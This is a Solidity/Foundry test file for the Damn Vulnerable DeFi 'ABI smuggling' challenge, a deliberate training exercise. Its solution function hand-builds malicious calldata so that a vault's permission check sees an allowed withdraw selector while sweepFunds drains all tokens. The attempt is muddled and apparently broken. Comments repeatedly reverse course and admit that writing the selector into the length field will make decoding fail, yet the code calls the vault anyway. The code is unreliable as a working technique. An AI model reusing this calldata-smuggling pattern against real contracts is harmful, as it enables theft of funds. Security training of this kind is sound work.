// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Key insight: calldataload(100) reads 32 bytes and takes first 4 bytes as selector
        // Standard encoding has data starting at position 100
        // We can shift it by 4 bytes so withdraw selector is at position 100
        // but the actual call data (sweepFunds) starts at 104
        
        bytes4 withdrawSel = vault.withdraw.selector;
        bytes4 sweepSel = vault.sweepFunds.selector;
        
        // Idea: actionData = [withdrawSel 4 bytes][sweepFunds complete call 68 bytes]
        // Total: 72 bytes
        // With offset=64 (standard), data at position 100
        // Position 100-103 = withdrawSel (verified)
        // Position 104+ = sweepFunds call (executed via functionCall)
        
        // Build sweep call
        bytes memory sweepCall = abi.encodeWithSelector(
            sweepSel,
            recovery,
            token
        );
        
        // Prepend withdraw selector
        bytes memory actionData = new bytes(4 + sweepCall.length);
        actionData[0] = withdrawSel[0];
        actionData[1] = withdrawSel[1];
        actionData[2] = withdrawSel[2];
        actionData[3] = withdrawSel[3];
        
        for (uint i = 0; i < sweepCall.length; i++) {
            actionData[4 + i] = sweepCall[i];
        }
        
        // But wait: functionCall will send actionData AS-IS to vault
        // Vault will try to decode starting at byte 0 = withdrawSel
        // This will call withdraw(), not sweepFunds!
        
        // The trick must be in execute() itself - it extracts actionData from calldata
        // and then sends it via functionCall
        // We need to manipulate HOW actionData is extracted
        
        // Actually, execute() does: target.functionCall(actionData)
        // where actionData is a `bytes calldata` parameter
        // Solidity will extract actionData based on the offset/length in the calldata
        
        // With custom encoding:
        // [0-3]: execute selector
        // [4-35]: target
        // [36-67]: offset=68 (not 64!)
        // [68-99]: padding (contains withdrawSel at position 100-103)
        // [100-103]: withdrawSel (read by calldataload)
        // [104-135]: length
        // [136+]: actual sweepCall data
        
        // When Solidity decodes actionData with offset=68:
        // - It reads length at position 4+68=72
        // Wait, no. If offset=68, then length is at 72, data at 104
        // But calldataload(100) would read bytes 100-131
        // If data is at 104, byte 100 is 4 bytes BEFORE data starts
        // That's in the length field!
        
        // Let me try offset=68:
        // Length at 4+68=72
        // Data at 72+32=104
        // calldataload(100) reads position 100-131
        // Position 100 is at the END of the offset field (positions 36-67 end at 67, then 68-99)
        // So position 100 is in the padding/length area (72-103)
        // Position 100-103 is at length[28:32] if length is at 72-103
        
        bytes memory callData = abi.encodeWithSelector(
            vault.execute.selector,
            address(vault),
            sweepCall
        );
        
        // Replace standard offset (64) with 68
        // The offset is at position 36-67 (bytes32)
        // Standard value: 0x0000000000000000000000000000000000000000000000000000000000000040 (64)
        // New value:      0x0000000000000000000000000000000000000000000000000000000000000044 (68)
        
        // Modify byte 67 from 0x40 to 0x44
        callData[67] = 0x44;
        
        // Now insert withdrawSel at position 100-103
        // These bytes need to be added since we shifted everything
        // Original structure: [sel][target][offset][length][data@100]
        // New structure: [sel][target][offset=68][padding 4 bytes][length][data@104]
        
        // Actually, with offset=68 instead of 64, data moves 4 bytes later
        // So we need to insert 4 bytes of padding
        
        // Let me rebuild from scratch:
        bytes memory newCallData = new bytes(callData.length + 4);
        
        // Copy up to and including offset field (positions 0-67)
        for (uint i = 0; i < 68; i++) {
            newCallData[i] = callData[i];
        }
        
        // Fix offset value to 68
        newCallData[67] = 0x44;
        
        // Insert 4 bytes padding with withdrawSel at position 100-103
        // Positions 68-99 are padding/length area
        // We want withdrawSel at 100-103
        // Length field moves from 68-99 to 72-103
        // So positions 68-71 are new padding
        newCallData[68] = 0x00;
        newCallData[69] = 0x00;
        newCallData[70] = 0x00;
        newCallData[71] = 0x00;
        
        // Positions 72-103: length (copy from original 68-99)
        for (uint i = 0; i < 32; i++) {
            newCallData[72 + i] = callData[68 + i];
        }
        
        // But we want withdrawSel at position 100-103
        // That's length[28:32]
        // Let's just overwrite those specific bytes
        newCallData[100] = withdrawSel[0];
        newCallData[101] = withdrawSel[1];
        newCallData[102] = withdrawSel[2];
        newCallData[103] = withdrawSel[3];
        
        // Positions 104+: data (copy from original 100+)
        for (uint i = 100; i < callData.length; i++) {
            newCallData[i + 4] = callData[i];
        }
        
        // This corrupts the length field by putting withdrawSel in it
        // The length will be wrong, causing decoding to fail
        
        // Let me try another approach: Just don't modify length, let it be corrupted
        (bool success,) = address(vault).call(newCallData);
        require(success, "Execute failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
